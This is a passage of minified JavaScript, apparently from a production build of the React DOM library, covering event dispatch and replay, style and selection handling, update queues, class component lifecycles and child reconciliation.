a.targetInst,c=b;do{if(!c){a.ancestors.push(c);break}var d=c;if(3===d.tag)d=d.stateNode.containerInfo;else{for(;d.return;)d=d.return;d=3!==d.tag?null:d.stateNode.containerInfo}if(!d)break;b=c.tag;5!==b&&6!==b||a.ancestors.push(c);c=Bb(d)}while(c);for(c=0;c<a.ancestors.length;c++){b=a.ancestors[c];var e=Ld(a.nativeEvent);d=a.topLevelType;var f=a.nativeEvent,g=a.eventSystemFlags;0===c&&(g|=64);for(var h=null,m=0;m<jc.length;m++){var n=jc[m];n&&(n=n.extractEvents(d,b,f,e,g))&&(h=jb(h,n))}pc(h)}}function Md(a,
b,c){if(!c.has(a)){switch(a){case "scroll":Cb(b,"scroll",!0);break;case "focus":case "blur":Cb(b,"focus",!0);Cb(b,"blur",!0);c.set("blur",null);c.set("focus",null);break;case "cancel":case "close":Tf(a)&&Cb(b,a,!0);break;case "invalid":case "submit":case "reset":break;default:-1===Db.indexOf(a)&&w(a,b)}c.set(a,null)}}function xi(a,b){var c=Jd(b);Nd.forEach(function(a){Md(a,b,c)});yi.forEach(function(a){Md(a,b,c)})}function Od(a,b,c,d,e){return{blockedOn:a,topLevelType:b,eventSystemFlags:c|32,nativeEvent:e,
container:d}}function Xf(a,b){switch(a){case "focus":case "blur":xa=null;break;case "dragenter":case "dragleave":ya=null;break;case "mouseover":case "mouseout":za=null;break;case "pointerover":case "pointerout":Eb.delete(b.pointerId);break;case "gotpointercapture":case "lostpointercapture":Fb.delete(b.pointerId)}}function Gb(a,b,c,d,e,f){if(null===a||a.nativeEvent!==f)return a=Od(b,c,d,e,f),null!==b&&(b=Hb(b),null!==b&&Yf(b)),a;a.eventSystemFlags|=d;return a}function zi(a,b,c,d,e){switch(b){case "focus":return xa=
Gb(xa,a,b,c,d,e),!0;case "dragenter":return ya=Gb(ya,a,b,c,d,e),!0;case "mouseover":return za=Gb(za,a,b,c,d,e),!0;case "pointerover":var f=e.pointerId;Eb.set(f,Gb(Eb.get(f)||null,a,b,c,d,e));return!0;case "gotpointercapture":return f=e.pointerId,Fb.set(f,Gb(Fb.get(f)||null,a,b,c,d,e)),!0}return!1}function Ai(a){var b=Bb(a.target);if(null!==b){var c=Na(b);if(null!==c)if(b=c.tag,13===b){if(b=Qf(c),null!==b){a.blockedOn=b;Pd(a.priority,function(){Bi(c)});return}}else if(3===b&&c.stateNode.hydrate){a.blockedOn=
3===c.tag?c.stateNode.containerInfo:null;return}}a.blockedOn=null}function rc(a){if(null!==a.blockedOn)return!1;var b=Qd(a.topLevelType,a.eventSystemFlags,a.container,a.nativeEvent);if(null!==b){var c=Hb(b);null!==c&&Yf(c);a.blockedOn=b;return!1}return!0}function Zf(a,b,c){rc(a)&&c.delete(b)}function Ci(){for(Rd=!1;0<fa.length;){var a=fa[0];if(null!==a.blockedOn){a=Hb(a.blockedOn);null!==a&&Di(a);break}var b=Qd(a.topLevelType,a.eventSystemFlags,a.container,a.nativeEvent);null!==b?a.blockedOn=b:fa.shift()}null!==
xa&&rc(xa)&&(xa=null);null!==ya&&rc(ya)&&(ya=null);null!==za&&rc(za)&&(za=null);Eb.forEach(Zf);Fb.forEach(Zf)}function Ib(a,b){a.blockedOn===b&&(a.blockedOn=null,Rd||(Rd=!0,$f(ag,Ci)))}function bg(a){if(0<fa.length){Ib(fa[0],a);for(var b=1;b<fa.length;b++){var c=fa[b];c.blockedOn===a&&(c.blockedOn=null)}}null!==xa&&Ib(xa,a);null!==ya&&Ib(ya,a);null!==za&&Ib(za,a);b=function(b){return Ib(b,a)};Eb.forEach(b);Fb.forEach(b);for(b=0;b<Jb.length;b++)c=Jb[b],c.blockedOn===a&&(c.blockedOn=null);for(;0<Jb.length&&
(b=Jb[0],null===b.blockedOn);)Ai(b),null===b.blockedOn&&Jb.shift()}function Sd(a,b){for(var c=0;c<a.length;c+=2){var d=a[c],e=a[c+1],f="on"+(e[0].toUpperCase()+e.slice(1));f={phasedRegistrationNames:{bubbled:f,captured:f+"Capture"},dependencies:[d],eventPriority:b};Td.set(d,b);cg.set(d,f);dg[e]=f}}function w(a,b){Cb(b,a,!1)}function Cb(a,b,c){var d=Td.get(b);switch(void 0===d?2:d){case 0:d=Ei.bind(null,b,1,a);break;case 1:d=Fi.bind(null,b,1,a);break;default:d=sc.bind(null,b,1,a)}c?a.addEventListener(b,
d,!0):a.addEventListener(b,d,!1)}function Ei(a,b,c,d){Oa||vd();var e=sc,f=Oa;Oa=!0;try{eg(e,a,b,c,d)}finally{(Oa=f)||ud()}}function Fi(a,b,c,d){Gi(Hi,sc.bind(null,a,b,c,d))}function sc(a,b,c,d){if(tc)if(0<fa.length&&-1<Nd.indexOf(a))a=Od(null,a,b,c,d),fa.push(a);else{var e=Qd(a,b,c,d);if(null===e)Xf(a,d);else if(-1<Nd.indexOf(a))a=Od(e,a,b,c,d),fa.push(a);else if(!zi(e,a,b,c,d)){Xf(a,d);a=Vf(a,d,null,b);try{uf(Wf,a)}finally{Uf(a)}}}}function Qd(a,b,c,d){c=Ld(d);c=Bb(c);if(null!==c){var e=Na(c);if(null===
e)c=null;else{var f=e.tag;if(13===f){c=Qf(e);if(null!==c)return c;c=null}else if(3===f){if(e.stateNode.hydrate)return 3===e.tag?e.stateNode.containerInfo:null;c=null}else e!==c&&(c=null)}}a=Vf(a,d,c,b);try{uf(Wf,a)}finally{Uf(a)}return null}function fg(a,b,c){return null==b||"boolean"===typeof b||""===b?"":c||"number"!==typeof b||0===b||Kb.hasOwnProperty(a)&&Kb[a]?(""+b).trim():b+"px"}function gg(a,b){a=a.style;for(var c in b)if(b.hasOwnProperty(c)){var d=0===c.indexOf("--"),e=fg(c,b[c],d);"float"===
c&&(c="cssFloat");d?a.setProperty(c,e):a[c]=e}}function Ud(a,b){if(b){if(Ii[a]&&(null!=b.children||null!=b.dangerouslySetInnerHTML))throw Error(k(137,a,""));if(null!=b.dangerouslySetInnerHTML){if(null!=b.children)throw Error(k(60));if(!("object"===typeof b.dangerouslySetInnerHTML&&"__html"in b.dangerouslySetInnerHTML))throw Error(k(61));}if(null!=b.style&&"object"!==typeof b.style)throw Error(k(62,""));}}function Vd(a,b){if(-1===a.indexOf("-"))return"string"===typeof b.is;switch(a){case "annotation-xml":case "color-profile":case "font-face":case "font-face-src":case "font-face-uri":case "font-face-format":case "font-face-name":case "missing-glyph":return!1;
default:return!0}}function oa(a,b){a=9===a.nodeType||11===a.nodeType?a:a.ownerDocument;var c=Jd(a);b=rd[b];for(var d=0;d<b.length;d++)Md(b[d],a,c)}function uc(){}function Wd(a){a=a||("undefined"!==typeof document?document:void 0);if("undefined"===typeof a)return null;try{return a.activeElement||a.body}catch(b){return a.body}}function hg(a){for(;a&&a.firstChild;)a=a.firstChild;return a}function ig(a,b){var c=hg(a);a=0;for(var d;c;){if(3===c.nodeType){d=a+c.textContent.length;if(a<=b&&d>=b)return{node:c,
offset:b-a};a=d}a:{for(;c;){if(c.nextSibling){c=c.nextSibling;break a}c=c.parentNode}c=void 0}c=hg(c)}}function jg(a,b){return a&&b?a===b?!0:a&&3===a.nodeType?!1:b&&3===b.nodeType?jg(a,b.parentNode):"contains"in a?a.contains(b):a.compareDocumentPosition?!!(a.compareDocumentPosition(b)&16):!1:!1}function kg(){for(var a=window,b=Wd();b instanceof a.HTMLIFrameElement;){try{var c="string"===typeof b.contentWindow.location.href}catch(d){c=!1}if(c)a=b.contentWindow;else break;b=Wd(a.document)}return b}
function Xd(a){var b=a&&a.nodeName&&a.nodeName.toLowerCase();return b&&("input"===b&&("text"===a.type||"search"===a.type||"tel"===a.type||"url"===a.type||"password"===a.type)||"textarea"===b||"true"===a.contentEditable)}function lg(a,b){switch(a){case "button":case "input":case "select":case "textarea":return!!b.autoFocus}return!1}function Yd(a,b){return"textarea"===a||"option"===a||"noscript"===a||"string"===typeof b.children||"number"===typeof b.children||"object"===typeof b.dangerouslySetInnerHTML&&
null!==b.dangerouslySetInnerHTML&&null!=b.dangerouslySetInnerHTML.__html}function kb(a){for(;null!=a;a=a.nextSibling){var b=a.nodeType;if(1===b||3===b)break}return a}function mg(a){a=a.previousSibling;for(var b=0;a;){if(8===a.nodeType){var c=a.data;if(c===ng||c===Zd||c===$d){if(0===b)return a;b--}else c===og&&b++}a=a.previousSibling}return null}function Bb(a){var b=a[Aa];if(b)return b;for(var c=a.parentNode;c;){if(b=c[Lb]||c[Aa]){c=b.alternate;if(null!==b.child||null!==c&&null!==c.child)for(a=mg(a);null!==
a;){if(c=a[Aa])return c;a=mg(a)}return b}a=c;c=a.parentNode}return null}function Hb(a){a=a[Aa]||a[Lb];return!a||5!==a.tag&&6!==a.tag&&13!==a.tag&&3!==a.tag?null:a}function Pa(a){if(5===a.tag||6===a.tag)return a.stateNode;throw Error(k(33));}function ae(a){return a[vc]||null}function pa(a){do a=a.return;while(a&&5!==a.tag);return a?a:null}function pg(a,b){var c=a.stateNode;if(!c)return null;var d=td(c);if(!d)return null;c=d[b];a:switch(b){case "onClick":case "onClickCapture":case "onDoubleClick":case "onDoubleClickCapture":case "onMouseDown":case "onMouseDownCapture":case "onMouseMove":case "onMouseMoveCapture":case "onMouseUp":case "onMouseUpCapture":case "onMouseEnter":(d=
!d.disabled)||(a=a.type,d=!("button"===a||"input"===a||"select"===a||"textarea"===a));a=!d;break a;default:a=!1}if(a)return null;if(c&&"function"!==typeof c)throw Error(k(231,b,typeof c));return c}function qg(a,b,c){if(b=pg(a,c.dispatchConfig.phasedRegistrationNames[b]))c._dispatchListeners=jb(c._dispatchListeners,b),c._dispatchInstances=jb(c._dispatchInstances,a)}function Ji(a){if(a&&a.dispatchConfig.phasedRegistrationNames){for(var b=a._targetInst,c=[];b;)c.push(b),b=pa(b);for(b=c.length;0<b--;)qg(c[b],
"captured",a);for(b=0;b<c.length;b++)qg(c[b],"bubbled",a)}}function be(a,b,c){a&&c&&c.dispatchConfig.registrationName&&(b=pg(a,c.dispatchConfig.registrationName))&&(c._dispatchListeners=jb(c._dispatchListeners,b),c._dispatchInstances=jb(c._dispatchInstances,a))}function Ki(a){a&&a.dispatchConfig.registrationName&&be(a._targetInst,null,a)}function lb(a){Kd(a,Ji)}function rg(){if(wc)return wc;var a,b=ce,c=b.length,d,e="value"in Ba?Ba.value:Ba.textContent,f=e.length;for(a=0;a<c&&b[a]===e[a];a++);var g=
c-a;for(d=1;d<=g&&b[c-d]===e[f-d];d++);return wc=e.slice(a,1<d?1-d:void 0)}function xc(){return!0}function yc(){return!1}function R(a,b,c,d){this.dispatchConfig=a;this._targetInst=b;this.nativeEvent=c;a=this.constructor.Interface;for(var e in a)a.hasOwnProperty(e)&&((b=a[e])?this[e]=b(c):"target"===e?this.target=d:this[e]=c[e]);this.isDefaultPrevented=(null!=c.defaultPrevented?c.defaultPrevented:!1===c.returnValue)?xc:yc;this.isPropagationStopped=yc;return this}function Li(a,b,c,d){if(this.eventPool.length){var e=
this.eventPool.pop();this.call(e,a,b,c,d);return e}return new this(a,b,c,d)}function Mi(a){if(!(a instanceof this))throw Error(k(279));a.destructor();10>this.eventPool.length&&this.eventPool.push(a)}function sg(a){a.eventPool=[];a.getPooled=Li;a.release=Mi}function tg(a,b){switch(a){case "keyup":return-1!==Ni.indexOf(b.keyCode);case "keydown":return 229!==b.keyCode;case "keypress":case "mousedown":case "blur":return!0;default:return!1}}function ug(a){a=a.detail;return"object"===typeof a&&"data"in
a?a.data:null}function Oi(a,b){switch(a){case "compositionend":return ug(b);case "keypress":if(32!==b.which)return null;vg=!0;return wg;case "textInput":return a=b.data,a===wg&&vg?null:a;default:return null}}function Pi(a,b){if(mb)return"compositionend"===a||!de&&tg(a,b)?(a=rg(),wc=ce=Ba=null,mb=!1,a):null;switch(a){case "paste":return null;case "keypress":if(!(b.ctrlKey||b.altKey||b.metaKey)||b.ctrlKey&&b.altKey){if(b.char&&1<b.char.length)return b.char;if(b.which)return String.fromCharCode(b.which)}return null;
case "compositionend":return xg&&"ko"!==b.locale?null:b.data;default:return null}}function yg(a){var b=a&&a.nodeName&&a.nodeName.toLowerCase();return"input"===b?!!Qi[a.type]:"textarea"===b?!0:!1}function zg(a,b,c){a=R.getPooled(Ag.change,a,b,c);a.type="change";sf(c);lb(a);return a}function Ri(a){pc(a)}function zc(a){var b=Pa(a);if(Gf(b))return a}function Si(a,b){if("change"===a)return b}function Bg(){Mb&&(Mb.detachEvent("onpropertychange",Cg),Nb=Mb=null)}function Cg(a){if("value"===a.propertyName&&
zc(Nb))if(a=zg(Nb,a,Ld(a)),Oa)pc(a);else{Oa=!0;try{ee(Ri,a)}finally{Oa=!1,ud()}}}function Ti(a,b,c){"focus"===a?(Bg(),Mb=b,Nb=c,Mb.attachEvent("onpropertychange",Cg)):"blur"===a&&Bg()}function Ui(a,b){if("selectionchange"===a||"keyup"===a||"keydown"===a)return zc(Nb)}function Vi(a,b){if("click"===a)return zc(b)}function Wi(a,b){if("input"===a||"change"===a)return zc(b)}function Xi(a){var b=this.nativeEvent;return b.getModifierState?b.getModifierState(a):(a=Yi[a])?!!b[a]:!1}function fe(a){return Xi}
function Zi(a,b){return a===b&&(0!==a||1/a===1/b)||a!==a&&b!==b}function Ob(a,b){if(Qa(a,b))return!0;if("object"!==typeof a||null===a||"object"!==typeof b||null===b)return!1;var c=Object.keys(a),d=Object.keys(b);if(c.length!==d.length)return!1;for(d=0;d<c.length;d++)if(!$i.call(b,c[d])||!Qa(a[c[d]],b[c[d]]))return!1;return!0}function Dg(a,b){var c=b.window===b?b.document:9===b.nodeType?b:b.ownerDocument;if(ge||null==nb||nb!==Wd(c))return null;c=nb;"selectionStart"in c&&Xd(c)?c={start:c.selectionStart,
end:c.selectionEnd}:(c=(c.ownerDocument&&c.ownerDocument.defaultView||window).getSelection(),c={anchorNode:c.anchorNode,anchorOffset:c.anchorOffset,focusNode:c.focusNode,focusOffset:c.focusOffset});return Pb&&Ob(Pb,c)?null:(Pb=c,a=R.getPooled(Eg.select,he,a,b),a.type="select",a.target=nb,lb(a),a)}function Ac(a){var b=a.keyCode;"charCode"in a?(a=a.charCode,0===a&&13===b&&(a=13)):a=b;10===a&&(a=13);return 32<=a||13===a?a:0}function q(a,b){0>ob||(a.current=ie[ob],ie[ob]=null,ob--)}function y(a,b,c){ob++;
ie[ob]=a.current;a.current=b}function pb(a,b){var c=a.type.contextTypes;if(!c)return Ca;var d=a.stateNode;if(d&&d.__reactInternalMemoizedUnmaskedChildContext===b)return d.__reactInternalMemoizedMaskedChildContext;var e={},f;for(f in c)e[f]=b[f];d&&(a=a.stateNode,a.__reactInternalMemoizedUnmaskedChildContext=b,a.__reactInternalMemoizedMaskedChildContext=e);return e}function N(a){a=a.childContextTypes;return null!==a&&void 0!==a}function Fg(a,b,c){if(B.current!==Ca)throw Error(k(168));y(B,b);y(G,c)}
function Gg(a,b,c){var d=a.stateNode;a=b.childContextTypes;if("function"!==typeof d.getChildContext)return c;d=d.getChildContext();for(var e in d)if(!(e in a))throw Error(k(108,na(b)||"Unknown",e));return M({},c,{},d)}function Bc(a){a=(a=a.stateNode)&&a.__reactInternalMemoizedMergedChildContext||Ca;Ra=B.current;y(B,a);y(G,G.current);return!0}function Hg(a,b,c){var d=a.stateNode;if(!d)throw Error(k(169));c?(a=Gg(a,b,Ra),d.__reactInternalMemoizedMergedChildContext=a,q(G),q(B),y(B,a)):q(G);y(G,c)}function Cc(){switch(aj()){case Dc:return 99;
case Ig:return 98;case Jg:return 97;case Kg:return 96;case Lg:return 95;default:throw Error(k(332));}}function Mg(a){switch(a){case 99:return Dc;case 98:return Ig;case 97:return Jg;case 96:return Kg;case 95:return Lg;default:throw Error(k(332));}}function Da(a,b){a=Mg(a);return bj(a,b)}function Ng(a,b,c){a=Mg(a);return je(a,b,c)}function Og(a){null===qa?(qa=[a],Ec=je(Dc,Pg)):qa.push(a);return Qg}function ha(){if(null!==Ec){var a=Ec;Ec=null;Rg(a)}Pg()}function Pg(){if(!ke&&null!==qa){ke=!0;var a=0;
try{var b=qa;Da(99,function(){for(;a<b.length;a++){var c=b[a];do c=c(!0);while(null!==c)}});qa=null}catch(c){throw null!==qa&&(qa=qa.slice(a+1)),je(Dc,ha),c;}finally{ke=!1}}}function Fc(a,b,c){c/=10;return 1073741821-(((1073741821-a+b/10)/c|0)+1)*c}function aa(a,b){if(a&&a.defaultProps){b=M({},b);a=a.defaultProps;for(var c in a)void 0===b[c]&&(b[c]=a[c])}return b}function le(){Gc=qb=Hc=null}function me(a){var b=Ic.current;q(Ic);a.type._context._currentValue=b}function Sg(a,b){for(;null!==a;){var c=
a.alternate;if(a.childExpirationTime<b)a.childExpirationTime=b,null!==c&&c.childExpirationTime<b&&(c.childExpirationTime=b);else if(null!==c&&c.childExpirationTime<b)c.childExpirationTime=b;else break;a=a.return}}function rb(a,b){Hc=a;Gc=qb=null;a=a.dependencies;null!==a&&null!==a.firstContext&&(a.expirationTime>=b&&(ia=!0),a.firstContext=null)}function W(a,b){if(Gc!==a&&!1!==b&&0!==b){if("number"!==typeof b||1073741823===b)Gc=a,b=1073741823;b={context:a,observedBits:b,next:null};if(null===qb){if(null===
Hc)throw Error(k(308));qb=b;Hc.dependencies={expirationTime:0,firstContext:b,responders:null}}else qb=qb.next=b}return a._currentValue}function ne(a){a.updateQueue={baseState:a.memoizedState,baseQueue:null,shared:{pending:null},effects:null}}function oe(a,b){a=a.updateQueue;b.updateQueue===a&&(b.updateQueue={baseState:a.baseState,baseQueue:a.baseQueue,shared:a.shared,effects:a.effects})}function Ea(a,b){a={expirationTime:a,suspenseConfig:b,tag:Tg,payload:null,callback:null,next:null};return a.next=
a}function Fa(a,b){a=a.updateQueue;if(null!==a){a=a.shared;var c=a.pending;null===c?b.next=b:(b.next=c.next,c.next=b);a.pending=b}}function Ug(a,b){var c=a.alternate;null!==c&&oe(c,a);a=a.updateQueue;c=a.baseQueue;null===c?(a.baseQueue=b.next=b,b.next=b):(b.next=c.next,c.next=b)}function Qb(a,b,c,d){var e=a.updateQueue;Ga=!1;var f=e.baseQueue,g=e.shared.pending;if(null!==g){if(null!==f){var h=f.next;f.next=g.next;g.next=h}f=g;e.shared.pending=null;h=a.alternate;null!==h&&(h=h.updateQueue,null!==h&&
(h.baseQueue=g))}if(null!==f){h=f.next;var m=e.baseState,n=0,k=null,ba=null,l=null;if(null!==h){var p=h;do{g=p.expirationTime;if(g<d){var t={expirationTime:p.expirationTime,suspenseConfig:p.suspenseConfig,tag:p.tag,payload:p.payload,callback:p.callback,next:null};null===l?(ba=l=t,k=m):l=l.next=t;g>n&&(n=g)}else{null!==l&&(l=l.next={expirationTime:1073741823,suspenseConfig:p.suspenseConfig,tag:p.tag,payload:p.payload,callback:p.callback,next:null});Vg(g,p.suspenseConfig);a:{var q=a,r=p;g=b;t=c;switch(r.tag){case 1:q=
r.payload;if("function"===typeof q){m=q.call(t,m,g);break a}m=q;break a;case 3:q.effectTag=q.effectTag&-4097|64;case Tg:q=r.payload;g="function"===typeof q?q.call(t,m,g):q;if(null===g||void 0===g)break a;m=M({},m,g);break a;case Jc:Ga=!0}}null!==p.callback&&(a.effectTag|=32,g=e.effects,null===g?e.effects=[p]:g.push(p))}p=p.next;if(null===p||p===h)if(g=e.shared.pending,null===g)break;else p=f.next=g.next,g.next=h,e.baseQueue=f=g,e.shared.pending=null}while(1)}null===l?k=m:l.next=ba;e.baseState=k;e.baseQueue=
l;Kc(n);a.expirationTime=n;a.memoizedState=m}}function Wg(a,b,c){a=b.effects;b.effects=null;if(null!==a)for(b=0;b<a.length;b++){var d=a[b],e=d.callback;if(null!==e){d.callback=null;d=e;e=c;if("function"!==typeof d)throw Error(k(191,d));d.call(e)}}}function Lc(a,b,c,d){b=a.memoizedState;c=c(d,b);c=null===c||void 0===c?b:M({},b,c);a.memoizedState=c;0===a.expirationTime&&(a.updateQueue.baseState=c)}function Xg(a,b,c,d,e,f,g){a=a.stateNode;return"function"===typeof a.shouldComponentUpdate?a.shouldComponentUpdate(d,
f,g):b.prototype&&b.prototype.isPureReactComponent?!Ob(c,d)||!Ob(e,f):!0}function Yg(a,b,c){var d=!1,e=Ca;var f=b.contextType;"object"===typeof f&&null!==f?f=W(f):(e=N(b)?Ra:B.current,d=b.contextTypes,f=(d=null!==d&&void 0!==d)?pb(a,e):Ca);b=new b(c,f);a.memoizedState=null!==b.state&&void 0!==b.state?b.state:null;b.updater=Mc;a.stateNode=b;b._reactInternalFiber=a;d&&(a=a.stateNode,a.__reactInternalMemoizedUnmaskedChildContext=e,a.__reactInternalMemoizedMaskedChildContext=f);return b}function Zg(a,
b,c,d){a=b.state;"function"===typeof b.componentWillReceiveProps&&b.componentWillReceiveProps(c,d);"function"===typeof b.UNSAFE_componentWillReceiveProps&&b.UNSAFE_componentWillReceiveProps(c,d);b.state!==a&&Mc.enqueueReplaceState(b,b.state,null)}function pe(a,b,c,d){var e=a.stateNode;e.props=c;e.state=a.memoizedState;e.refs=$g;ne(a);var f=b.contextType;"object"===typeof f&&null!==f?e.context=W(f):(f=N(b)?Ra:B.current,e.context=pb(a,f));Qb(a,c,e,d);e.state=a.memoizedState;f=b.getDerivedStateFromProps;
"function"===typeof f&&(Lc(a,b,f,c),e.state=a.memoizedState);"function"===typeof b.getDerivedStateFromProps||"function"===typeof e.getSnapshotBeforeUpdate||"function"!==typeof e.UNSAFE_componentWillMount&&"function"!==typeof e.componentWillMount||(b=e.state,"function"===typeof e.componentWillMount&&e.componentWillMount(),"function"===typeof e.UNSAFE_componentWillMount&&e.UNSAFE_componentWillMount(),b!==e.state&&Mc.enqueueReplaceState(e,e.state,null),Qb(a,c,e,d),e.state=a.memoizedState);"function"===
typeof e.componentDidMount&&(a.effectTag|=4)}function Rb(a,b,c){a=c.ref;if(null!==a&&"function"!==typeof a&&"object"!==typeof a){if(c._owner){c=c._owner;if(c){if(1!==c.tag)throw Error(k(309));var d=c.stateNode}if(!d)throw Error(k(147,a));var e=""+a;if(null!==b&&null!==b.ref&&"function"===typeof b.ref&&b.ref._stringRef===e)return b.ref;b=function(a){var b=d.refs;b===$g&&(b=d.refs={});null===a?delete b[e]:b[e]=a};b._stringRef=e;return b}if("string"!==typeof a)throw Error(k(284));if(!c._owner)throw Error(k(290,
a));}return a}function Nc(a,b){if("textarea"!==a.type)throw Error(k(31,"[object Object]"===Object.prototype.toString.call(b)?"object with keys {"+Object.keys(b).join(", ")+"}":b,""));}function ah(a){function b(b,c){if(a){var d=b.lastEffect;null!==d?(d.nextEffect=c,b.lastEffect=c):b.firstEffect=b.lastEffect=c;c.nextEffect=null;c.effectTag=8}}function c(c,d){if(!a)return null;for(;null!==d;)b(c,d),d=d.sibling;return null}function d(a,b){for(a=new Map;null!==b;)null!==b.key?a.set(b.key,b):a.set(b.index,
b),b=b.sibling;return a}function e(a,b){a=Sa(a,b);a.index=0;a.sibling=null;return a}function f(b,c,d){b.index=d;if(!a)return c;d=b.alternate;if(null!==d)return d=d.index,d<c?(b.effectTag=2,c):d;b.effectTag=2;return c}function g(b){a&&null===b.alternate&&(b.effectTag=2);return b}function h(a,b,c,d){if(null===b||6!==b.tag)return b=qe(c,a.mode,d),b.return=a,b;b=e(b,c);b.return=a;return b}function m(a,b,c,d){if(null!==b&&b.elementType===c.type)return d=e(b,c.props),d.ref=Rb(a,b,c),d.return=a,d;d=Oc(c.type,
c.key,c.props,null,a.mode,d);d.ref=Rb(a,b,c);d.return=a;return d}function n(a,b,c,d){if(null===b||4!==b.tag||b.stateNode.containerInfo!==c.containerInfo||b.stateNode.implementation!==c.implementation)return b=re(c,a.mode,d),b.return=a,b;b=e(b,c.children||[]);b.return=a;return b}function l(a,b,c,d,f){if(null===b||7!==b.tag)return b=Ha(c,a.mode,d,f),b.return=a,b;b=e(b,c);b.return=a;return b}function ba(a,b,c){if("string"===typeof b||"number"===typeof b)return b=qe(""+b,a.mode,c),b.return=a,b;if("object"===
typeof b&&null!==b){switch(b.$$typeof){case Pc:return c=Oc(b.type,b.key,b.props,null,a.mode,c),c.ref=Rb(a,null,b),c.return=a,c;case gb:return b=re(b,a.mode,c),b.return=a,b}if(Qc(b)||zb(b))return b=Ha(b,a.mode,c,null),b.return=a,b;Nc(a,b)}return null}function p(a,b,c,d){var e=null!==b?b.key:null;if("string"===typeof c||"number"===typeof c)return null!==e?null:h(a,b,""+c,d);if("object"===typeof c&&null!==c){switch(c.$$typeof){case Pc:return c.key===e?c.type===Ma?l(a,b,c.props.children,d,e):m(a,b,c,
d):null;case gb:return c.key===e?n(a,b,c,d):null}if(Qc(c)||zb(c))return null!==e?null:l(a,b,c,d,null);Nc(a,c)}return null}function t(a,b,c,d,e){if("string"===typeof d||"number"===typeof d)return a=a.get(c)||null,h(b,a,""+d,e);if("object"===typeof d&&null!==d){switch(d.$$typeof){case Pc:return a=a.get(null===d.key?c:d.key)||null,d.type===Ma?l(b,a,d.props.children,e,d.key):m(b,a,d,e);case gb:return a=a.get(null===d.key?c:d.key)||null,n(b,a,d,e)}if(Qc(d)||zb(d))return a=a.get(c)||null,l(b,a,d,e,null);
Nc(b,d)}return null}function q(e,g,h,m){for(var n=null,k=null,l=g,r=g=0,C=null;null!==l&&r<h.length;r++){l.index>r?(C=l,l=null):C=l.sibling;var O=p(e,l,h[r],m);if(null===O){null===l&&(l=C);break}a&&l&&null===O.alternate&&b(e,l);g=f(O,g,r);null===k?n=O:k.sibling=O;k=O;l=C}if(r===h.length)return c(e,l),n;if(null===l){for(;r<h.length;r++)l=ba(e,h[r],m),null!==l&&(g=f(l,g,r),null===k?n=l:k.sibling=l,k=l);return n}for(l=d(e,l);r<h.length;r++)C=t(l,e,r,h[r],m),null!==C&&(a&&null!==C.alternate&&l.delete(null===
C.key?r:C.key),g=f(C,g,r),null===k?n=C:k.sibling=C,k=C);a&&l.forEach(function(a){return b(e,a)});return n}function w(e,g,h,n){var m=zb(h);if("function"!==typeof m)throw Error(k(150));h=m.call(h);if(null==h)throw Error(k(151));for(var l=m=null,r=g,C=g=0,O=null,v=h.next();null!==r&&!v.done;C++,v=h.next()){r.index>C?(O=r,r=null):O=r.sibling;var q=p(e,r,v.value,n);if(null===q){null===r&&(r=O);break}a&&r&&null===q.alternate&&b(e,r);g=f(q,g,C);null===l?m=q:l.sibling=q;l=q;r=O}if(v.done)return c(e,r),m;
if(null===r){for(;!v.done;C++,v=h.next())v=ba(e,v.value,n),null!==v&&(g=f(v,g,C),null===l?m=v:l.sibling=v,l=v);return m}for(r=d(e,r);!v.done;C++,v=h.next())v=t(r,e,C,v.value,n),null!==v&&(a&&null!==v.alternate&&r.delete(null===v.key?C:v.key),g=f(v,g,C),null===l?m=v:l.sibling=v,l=v);a&&r.forEach(function(a){return b(e,a)});return m}return function(a,d,f,h){var m="object"===typeof f&&null!==f&&f.type===Ma&&null===f.key;m&&(f=f.props.children);var n="object"===typeof f&&null!==f;if(n)switch(f.$$typeof){case Pc:a:{n=
f.key;for(m=d;null!==m;){if(m.key===n){switch(m.tag){case 7:if(f.type===Ma){c(a,m.sibling);d=e(m,f.props.children);d.return=a;a=d;break a}break;default:if(m.elementType===f.type){c(a,m.sibling);d=e(m,f.props);d.ref=Rb(a,m,f);d.return=a;a=d;break a}}c(a,m);break}else b(a,m);m=m.sibling}f.type===Ma?(d=Ha(f.props.children,a.mode,h,f.key),d.return=a,a=d):(h=Oc(f.type,f.key,f.props,null,a.mode,h),h.ref=Rb(a,d,f),h.return=a,a=h)}return g(a);case gb:a:{for(m=f.key;null!==d;){if(d.key===m)if(4===d.tag&&d.stateNode.containerInfo===
f.containerInfo&&d.stateNode.implementation===f.implementation){c(a,d.sibling);d=e(d,f.children||[]);d.return=a;a=d;break a}else{c(a,d);break}else b(a,d);d=d.sibling}d=re(f,a.mode,h);d.return=a;a=d}return g(a)}if("string"===typeof f||"number"===typeof f)return f=""+f,null!==d&&6===d.tag?(c(a,d.sibling),d=e(d,f),d.return=a,a=d):(c(a,d),d=qe(f,a.mode,h),d.return=a,a=d),g(a);if(Qc(f))return q(a,d,f,h);if(zb(f))return w(a,d,f,h);n&&Nc(a,f);if("undefined"===typeof f&&!m)switch(a.tag){case 1:case 0:throw a=
a.type,Error(k(152,a.displayName||a.name||"Component"));}return c(a,d)}}function Ta(a){if(a===Sb)throw Error(k(174));return a}function se(a,b){y(Tb,b);y(Ub,a);y(ja,Sb);a=b.nodeType;switch(a){case 9:case 11:b=(b=b.documentElement)?b.namespaceURI:Hd(null,"");break;default:a=8===a?b.parentNode:b,b=a.namespaceURI||null,a=a.tagName,b=Hd(b,a)}q(ja);y(ja,b)}function tb(a){q(ja);q(Ub);q(Tb)}function bh(a){Ta(Tb.current);var b=Ta(ja.current);var c=Hd(b,a.type);b!==c&&(y(Ub,a),y(ja,c))}function te(a){Ub.current===
a&&(q(ja),q(Ub))}function Rc(a){for(var b=a;null!==b;){if(13===b.tag){var c=b.memoizedState;if(null!==c&&(c=c.dehydrated,null===c||c.data===$d||c.data===Zd))return b}else if(19===b.tag&&void 0!==b.memoizedProps.revealOrder){if(0!==(b.effectTag&64))return b}else if(null!==b.child){b.child.return=b;b=b.child;continue}if(b===a)break;for(;null===b.sibling;){if(null===b.return||b.return===a)return null;b=b.return}b.sibling.return=b.return;b=b.sibling}return null}function ue(a,b){return{responder:a,props:b}}
